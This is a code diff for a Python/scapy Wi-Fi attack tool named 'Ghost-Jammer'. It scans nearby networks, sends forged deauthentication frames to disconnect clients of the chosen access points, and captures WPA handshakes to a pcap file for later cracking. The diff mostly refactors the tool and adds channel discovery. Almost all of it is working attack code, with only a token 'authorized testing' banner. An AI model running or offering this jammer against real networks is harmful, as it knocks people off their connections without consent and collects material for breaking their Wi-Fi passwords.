@@ -3,6 +3,8 @@
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
+from scapy.layers.eap import EAPOL
+from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Elt, Dot11Deauth, RadioTap
 conf.verb = 0
 import os
 import sys
@@ -18,8 +20,6 @@ import struct
 import fcntl
 import json
 from collections import defaultdict
-from scapy.sendrecv import sniff
-from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Elt, Dot11Deauth, RadioTap
 
 # Console colors
 W  = '\033[0m'  # white (normal)
@@ -46,8 +46,8 @@ selected_targets = []
 handshake_capture = False
 capture_file = "ghost_jammer_capture.pcap"
 args = None
-scan_timeout = 20  # Default scan duration
-handshake_timeout = 120  # Default handshake capture duration
+scan_timeout = 20
+handshake_timeout = 120
 handshake_captured = False
 
 # Ghost-Jammer Banner
@@ -65,60 +65,20 @@ def banner():
 {R}Use only for authorized security testing!{W}
 """)
 
-# Main Menu
-def main_menu():
-    banner()
-    print(f"{O}Main Menu:{W}")
-    print(f"  {C}1.{W} Scan Networks")
-    print(f"  {C}2.{W} Select Targets")
-    print(f"  {C}3.{W} Start Attack")
-    print(f"  {C}4.{W} Capture Handshakes")
-    print(f"  {C}5.{W} View Scan Results")
-    print(f"  {C}6.{W} Configure Settings")
-    print(f"  {C}7.{W} Save Scan Results")
-    print(f"  {C}8.{W} Exit")
-    choice = input(f"\n[{G}?{W}] Select an option: ")
-    return choice
-
-# Settings Menu
-def settings_menu():
-    global args, scan_timeout, handshake_timeout
-    banner()
-    print(f"{O}Configuration Settings:{W}")
-    print(f"  {C}1.{W} Interface: {G}{args.interface if args.interface else 'auto'}{W}")
-    print(f"  {C}2.{W} Channel: {G}{args.channel if args.channel else 'all'}{W}")
-    print(f"  {C}3.{W} Skip MAC: {G}{args.skip if args.skip else 'none'}{W}")
-    print(f"  {C}4.{W} Max Clients: {G}{args.maximum if args.maximum else 'unlimited'}{W}")
-    print(f"  {C}5.{W} Time Interval: {G}{args.timeinterval if args.timeinterval else 'fastest'}{W}")
-    print(f"  {C}6.{W} Packets: {G}{args.packets if args.packets else '1'}{W}")
-    print(f"  {C}7.{W} Directed Only: {G}{'yes' if args.directedonly else 'no'}{W}")
-    print(f"  {C}8.{W} Target AP: {G}{args.accesspoint if args.accesspoint else 'all'}{W}")
-    print(f"  {C}9.{W} World Channels: {G}{'yes' if args.world else 'no'}{W}")
-    print(f"  {C}10.{W} Scan Duration: {G}{scan_timeout}{W} seconds")
-    print(f"  {C}11.{W} Handshake Timeout: {G}{handshake_timeout}{W} seconds")
-    print(f"  {C}0.{W} Back to Main Menu")
-    
-    choice = input(f"\n[{G}?{W}] Select setting to change: ")
-    return choice
-
-# Parse command-line arguments
 def parse_args():
     parser = argparse.ArgumentParser()
     parser.add_argument("-s", "--skip", help="Skip deauthing this MAC address")
     parser.add_argument("-i", "--interface", help="Monitor mode interface")
-    parser.add_argument("-c", "--channel", help="Listen on specific channel")
-    parser.add_argument("-m", "--maximum", help="Max number of clients to deauth")
+    parser.add_argument("-c", "--channel", type=int, help="Listen on specific channel")
+    parser.add_argument("-m", "--maximum", type=int, default=0, help="Max number of clients to deauth")
     parser.add_argument("-n", "--noupdate", action='store_true', help="Don't clear deauth list when max reached")
-    parser.add_argument("-t", "--timeinterval", help="Time interval between packets")
-    parser.add_argument("-p", "--packets", help="Number of packets per burst")
+    parser.add_argument("-t", "--timeinterval", type=float, default=0.1, help="Time interval between packets")
+    parser.add_argument("-p", "--packets", type=int, default=1, help="Number of packets per burst")
     parser.add_argument("-d", "--directedonly", action='store_true', help="Only send to client/AP pairs")
     parser.add_argument("-a", "--accesspoint", help="Target specific AP MAC address")
     parser.add_argument("--world", action="store_true", help="Enable 13 channels mode")
     return parser.parse_args()
 
-########################################
-# Interface Functions
-########################################
 def get_mon_iface():
     global monitor_on
     monitors, interfaces = iwconfig()
@@ -131,8 +91,7 @@ def get_mon_iface():
     else:
         print(f'[{G}*{W}] Finding most powerful interface...')
         interface = get_iface(interfaces)
-        monmode = start_mon_mode(interface)
-        return monmode
+        return start_mon_mode(interface)
 
 def iwconfig():
     monitors = []
@@ -200,12 +159,28 @@ def mon_mac():
     print(f'[{G}*{W}] Monitor: {G}{mon_iface}{W} - {O}{mon_MAC}{W}')
     return mon_MAC
 
-########################################
-# Scanning Functions
-########################################
+def get_channels():
+    channels = []
+    try:
+        proc = Popen(['iw', 'list'], stdout=PIPE, stderr=DN)
+        output = proc.communicate()[0].decode()
+        
+        # Parse supported channels
+        for line in output.split('\n'):
+            if 'MHz' in line and 'disabled' not in line:
+                channel = line.split('[')[1].split(']')[0]
+                channels.append(channel)
+        
+        if not channels:
+            channels = list(range(1, 14)) if args.world else list(range(1, 12))
+            
+        return sorted([int(c) for c in channels])
+    except:
+        return list(range(1, 14)) if args.world else list(range(1, 12))
+
 def channel_hopper():
     global current_channel, stop_scan
-    channels = list(range(1, 14)) if args.world else list(range(1, 12))
+    channels = get_channels()
     channel_index = 0
     
     while not stop_scan:
@@ -224,15 +199,11 @@ def packet_handler(pkt):
         
     if pkt.haslayer(Dot11Beacon):
         try:
-            # Extract MAC address of the network
             bssid = pkt[Dot11].addr3.lower()
-            
-            # Get the name of it
             ssid = pkt[Dot11Elt].info.decode()
             if ssid == "" or ssid == "\x00":
                 ssid = "<hidden>"
                 
-            # Extract network stats
             try:
                 channel = str(ord(pkt[Dot11Elt:3].info))
             except:
@@ -240,14 +211,12 @@ def packet_handler(pkt):
                 
             dbm_signal = pkt.dBm_AntSignal
             stats = pkt[Dot11Beacon].network_stats()
-            channel = stats.get("channel", "?")
+            channel = stats.get("channel", channel)
             
-            # Check if we already have this network
             found = False
             for ap in APs:
                 if ap['bssid'] == bssid:
                     found = True
-                    # Update channel if we have a better value
                     if channel != "?" and ap['channel'] == "?":
                         ap['channel'] = channel
                     break
@@ -266,11 +235,9 @@ def packet_handler(pkt):
             pass
             
     elif pkt.haslayer(Dot11):
-        # Client probe request
-        if pkt.type == 0 and pkt.subtype == 4:
+        if pkt.type == 0 and pkt.subtype == 4:  # Probe request
             try:
                 client = pkt.addr2.lower()
-                # Look for the AP this client is probing for
                 for ap in APs:
                     if ap['bssid'] in pkt.addr3.lower():
                         if client not in ap['clients'] and client != ap['bssid']:
@@ -279,8 +246,7 @@ def packet_handler(pkt):
             except:
                 pass
         
-        # Data packet (client to AP)
-        elif pkt.type == 2:
+        elif pkt.type == 2:  # Data frame
             try:
                 client = pkt.addr1.lower() if pkt.addr1 != 'ff:ff:ff:ff:ff:ff' else None
                 ap_bssid = pkt.addr2.lower()
@@ -307,7 +273,6 @@ def display_networks():
     print(f"{C}ID  {'BSSID':17}  CH  {'ESSID':20}  Clients  Signal{W}")
     print(f"{C}{'-'*60}{W}")
     
-    # Sort by signal strength (strongest first)
     APs.sort(key=lambda x: x.get('signal', -100), reverse=True)
     
     for i, ap in enumerate(APs):
@@ -331,7 +296,6 @@ def scan_networks():
     APs = []
     stop_scan = False
     
-    # Setup monitor interface
     try:
         mon_iface = get_mon_iface()
         conf.iface = mon_iface
@@ -344,12 +308,10 @@ def scan_networks():
     print(f"[{G}+{W}] Starting network scan on {G}{mon_iface}{W}...")
     print(f"[{G}*{W}] Scanning all channels (Press Ctrl+C to stop)\n")
     
-    # Start channel hopper
     hopper = Thread(target=channel_hopper)
     hopper.daemon = True
     hopper.start()
     
-    # Start sniffer
     try:
         print(f"[{G}*{W}] Scanning for {T}{scan_timeout}{W} seconds...")
         sniff(iface=mon_iface, prn=packet_handler, store=0, timeout=scan_timeout)
@@ -368,20 +330,20 @@ def scan_networks():
     
     display_networks()
     
-    # Target selection
-    targets = input("\nSelect targets: ")
-    if targets.strip() == "0":
-        return
-    
+    target_input = input("\nSelect targets (comma separated IDs, 0 to cancel): ")
     global selected_targets
     selected_targets = []
-    for tid in targets.split(','):
-        try:
-            idx = int(tid.strip()) - 1
-            if 0 <= idx < len(APs):
-                selected_targets.append(APs[idx])
-        except:
-            pass
+    
+    if target_input.strip() != "0":
+        for tid in target_input.split(','):
+            try:
+                tid = tid.strip()
+                if tid:
+                    idx = int(tid) - 1
+                    if 0 <= idx < len(APs):
+                        selected_targets.append(APs[idx])
+            except ValueError:
+                pass
     
     if selected_targets:
         print(f"\n[{G}+{W}] Selected targets:")
@@ -389,19 +351,16 @@ def scan_networks():
             print(f"  - {O}{t['bssid']}{W} ({T}{t['ssid']}{W})")
         input("\nPress Enter to continue...")
 
-########################################
-# Attack Functions
-########################################
 def channel_hop_attack():
     global current_channel, stop_attack
     channels = set()
     
-    # Get channels from selected targets
     for target in selected_targets:
-        channels.add(target['channel'])
+        if target['channel'] != "?":
+            channels.add(target['channel'])
     
     if not channels:
-        channels = list(range(1, 14)) if args.world else list(range(1, 12))
+        channels = get_channels()
     else:
         channels = sorted([int(c) for c in channels])
     
@@ -424,21 +383,19 @@ def deauth_attack():
         return
     
     for target in selected_targets:
-        # Deauth clients
         for client in target['clients']:
             try:
                 pkt1 = RadioTap()/Dot11(addr1=client, addr2=target['bssid'], addr3=target['bssid'])/Dot11Deauth()
                 pkt2 = RadioTap()/Dot11(addr1=target['bssid'], addr2=client, addr3=client)/Dot11Deauth()
-                sendp(pkt1, iface=mon_iface, count=1, verbose=0)
-                sendp(pkt2, iface=mon_iface, count=1, verbose=0)
+                sendp(pkt1, iface=mon_iface, count=args.packets, verbose=0)
+                sendp(pkt2, iface=mon_iface, count=args.packets, verbose=0)
             except:
                 pass
         
-        # Deauth broadcast
         if not args.directedonly:
             try:
                 pkt = RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff', addr2=target['bssid'], addr3=target['bssid'])/Dot11Deauth()
-                sendp(pkt, iface=mon_iface, count=1, verbose=0)
+                sendp(pkt, iface=mon_iface, count=args.packets, verbose=0)
             except:
                 pass
 
@@ -447,13 +404,14 @@ def capture_handshake(pkt):
     if not handshake_capture:
         return
     
-    # Capture EAPOL handshake packets
-    if pkt.haslayer(EAPOL):
+    # Capture beacon frames from target APs
+    if pkt.haslayer(Dot11Beacon) and any(t['bssid'] == pkt.addr3.lower() for t in selected_targets):
+        wrpcap(capture_file, pkt, append=True)
+    
+    # Capture all EAPOL packets
+    elif pkt.haslayer(EAPOL):
         wrpcap(capture_file, pkt, append=True)
         handshake_captured = True
-    # Capture beacon frames for SSID info
-    elif pkt.haslayer(Dot11Beacon) and any(t['bssid'] == pkt.addr3.lower() for t in selected_targets):
-        wrpcap(capture_file, pkt, append=True)
 
 def attack_status():
     global stop_attack
@@ -468,7 +426,7 @@ def attack_status():
         print(f"{C}{'-'*50}{W}")
         
         for i, target in enumerate(selected_targets):
-            status = f"{G}ACTIVE{W}" if i < 3 else f"{T}QUEUED{W}"  # Simplified status
+            status = f"{G}ACTIVE{W}" if i < 3 else f"{T}QUEUED{W}"
             print(f"{T}{target['ssid'][:18]:20}{W} {P}{len(target['clients']):>6}{W} {R}{i*15:>8}{W} {status:>10}")
         
         print(f"\n[{G}+{W}] Elapsed: {T}{elapsed}{W} seconds | Channel: {G}{current_channel}{W}")
@@ -494,7 +452,6 @@ def start_attack():
     banner()
     print(f"[{G}*{W}] Starting attack on {T}{len(selected_targets)}{W} targets...")
     
-    # Setup monitor interface
     try:
         mon_iface = get_mon_iface()
         conf.iface = mon_iface
@@ -506,7 +463,6 @@ def start_attack():
     stop_attack = False
     handshake_captured = False
     
-    # Start attack threads
     attack_thread = Thread(target=channel_hop_attack)
     attack_thread.daemon = True
     attack_thread.start()
@@ -515,17 +471,21 @@ def start_attack():
     status_thread.daemon = True
     status_thread.start()
     
-    # Start handshake capture if requested
     if handshake_capture:
+        # Clear the capture file
+        if os.path.exists(capture_file):
+            try:
+                os.remove(capture_file)
+            except:
+                pass
         print(f"[{G}+{W}] Capturing handshakes to {capture_file} (timeout: {handshake_timeout}s)")
         try:
             sniff(iface=mon_iface, prn=capture_handshake, store=0, timeout=handshake_timeout)
         except Exception as e:
             print(f"[{R}!{W}] Capture error: {e}")
     
-    # Stop attack after timeout or if handshake captured
     stop_attack = True
-    time.sleep(1)  # Let threads finish
+    time.sleep(1)
     
     remove_mon_iface()
     
@@ -533,7 +493,6 @@ def start_attack():
         if handshake_captured:
             print(f"\n[{G}++{W}] {G}HANDSHAKE SUCCESSFULLY CAPTURED!{W}")
             print(f"[{G}*{W}] Saved to: {T}{capture_file}{W}")
-            print(f"[{G}*{W}] You can now use tools like aircrack-ng to crack the file")
         else:
             print(f"\n[{R}!!{W}] {R}No handshake captured during timeout period{R}")
         input("\nPress Enter to return to menu...")
@@ -604,6 +563,40 @@ def load_scan_results():
         time.sleep(2)
         return False
 
+def settings_menu():
+    global args, scan_timeout, handshake_timeout
+    banner()
+    print(f"{O}Configuration Settings:{W}")
+    print(f"  {C}1.{W} Interface: {G}{args.interface if args.interface else 'auto'}{W}")
+    print(f"  {C}2.{W} Channel: {G}{args.channel if args.channel else 'all'}{W}")
+    print(f"  {C}3.{W} Skip MAC: {G}{args.skip if args.skip else 'none'}{W}")
+    print(f"  {C}4.{W} Max Clients: {G}{args.maximum if args.maximum else 'unlimited'}{W}")
+    print(f"  {C}5.{W} Time Interval: {G}{args.timeinterval}{W} sec")
+    print(f"  {C}6.{W} Packets: {G}{args.packets}{W}")
+    print(f"  {C}7.{W} Directed Only: {G}{'yes' if args.directedonly else 'no'}{W}")
+    print(f"  {C}8.{W} Target AP: {G}{args.accesspoint if args.accesspoint else 'all'}{W}")
+    print(f"  {C}9.{W} World Channels: {G}{'yes' if args.world else 'no'}{W}")
+    print(f"  {C}10.{W} Scan Duration: {G}{scan_timeout}{W} seconds")
+    print(f"  {C}11.{W} Handshake Timeout: {G}{handshake_timeout}{W} seconds")
+    print(f"  {C}0.{W} Back to Main Menu")
+    
+    choice = input(f"\n[{G}?{W}] Select setting to change: ")
+    return choice
+
+def main_menu():
+    banner()
+    print(f"{O}Main Menu:{W}")
+    print(f"  {C}1.{W} Scan Networks")
+    print(f"  {C}2.{W} Select Targets")
+    print(f"  {C}3.{W} Start Attack")
+    print(f"  {C}4.{W} Capture Handshakes")
+    print(f"  {C}5.{W} View Scan Results")
+    print(f"  {C}6.{W} Configure Settings")
+    print(f"  {C}7.{W} Save Scan Results")
+    print(f"  {C}8.{W} Exit")
+    choice = input(f"\n[{G}?{W}] Select an option: ")
+    return choice
+
 if __name__ == "__main__":
     if os.geteuid() != 0:
         sys.exit(f'[{R}-{W}] Please run as root')
@@ -615,39 +608,41 @@ if __name__ == "__main__":
         while True:
             choice = main_menu()
             
-            if choice == '1':  # Scan Networks
+            if choice == '1':
                 scan_networks()
-            elif choice == '2':  # Select Targets
+            elif choice == '2':
                 if not APs:
                     print(f"[{R}!{W}] No scan results! Please scan first.")
                     time.sleep(1)
                 else:
                     display_networks()
-                    targets = input("\nSelect targets (comma separated): ")
+                    target_input = input("\nSelect targets (comma separated IDs): ")
                     selected_targets = []
-                    for tid in targets.split(','):
+                    for tid in target_input.split(','):
                         try:
-                            idx = int(tid.strip()) - 1
-                            if 0 <= idx < len(APs):
-                                selected_targets.append(APs[idx])
-                        except:
+                            tid = tid.strip()
+                            if tid:
+                                idx = int(tid) - 1
+                                if 0 <= idx < len(APs):
+                                    selected_targets.append(APs[idx])
+                        except ValueError:
                             pass
                     if selected_targets:
                         print(f"[{G}+{W}] Selected {len(selected_targets)} targets")
                     time.sleep(1)
-            elif choice == '3':  # Start Attack
+            elif choice == '3':
                 handshake_capture = False
                 start_attack()
-            elif choice == '4':  # Capture Handshakes
+            elif choice == '4':
                 capture_handshakes()
-            elif choice == '5':  # View Scan Results
+            elif choice == '5':
                 if APs:
                     display_networks()
                     input("\nPress Enter to continue...")
                 else:
                     print(f"[{R}!{W}] No scan results! Please scan first.")
                     time.sleep(1)
-            elif choice == '6':  # Configure Settings
+            elif choice == '6':
                 while True:
                     setting_choice = settings_menu()
                     if setting_choice == '0':
@@ -661,9 +656,9 @@ if __name__ == "__main__":
                     elif setting_choice == '4':
                         args.maximum = input(f"\n[{G}?{W}] Enter max clients: ")
                     elif setting_choice == '5':
-                        args.timeinterval = input(f"\n[{G}?{W}] Enter time interval (seconds): ")
+                        args.timeinterval = float(input(f"\n[{G}?{W}] Enter time interval (seconds): "))
                     elif setting_choice == '6':
-                        args.packets = input(f"\n[{G}?{W}] Enter packets per burst: ")
+                        args.packets = int(input(f"\n[{G}?{W}] Enter packets per burst: "))
                     elif setting_choice == '7':
                         args.directedonly = not args.directedonly
                     elif setting_choice == '8':
@@ -671,20 +666,12 @@ if __name__ == "__main__":
                     elif setting_choice == '9':
                         args.world = not args.world
                     elif setting_choice == '10':
-                        try:
-                            new_timeout = int(input(f"\n[{G}?{W}] Enter scan duration (seconds): "))
-                            scan_timeout = new_timeout
-                        except:
-                            print(f"[{R}!{W}] Invalid input")
+                        scan_timeout = int(input(f"\n[{G}?{W}] Enter scan duration (seconds): "))
                     elif setting_choice == '11':
-                        try:
-                            new_timeout = int(input(f"\n[{G}?{W}] Enter handshake capture timeout (seconds): "))
-                            handshake_timeout = new_timeout
-                        except:
-                            print(f"[{R}!{W}] Invalid input")
-            elif choice == '7':  # Save Scan Results
+                        handshake_timeout = int(input(f"\n[{G}?{W}] Enter handshake capture timeout (seconds): "))
+            elif choice == '7':
                 save_scan_results()
-            elif choice == '8':  # Exit
+            elif choice == '8':
                 print(f"\n[{G}*{W}] Exiting Ghost-Jammer...")
                 remove_mon_iface()
                 DN.close()
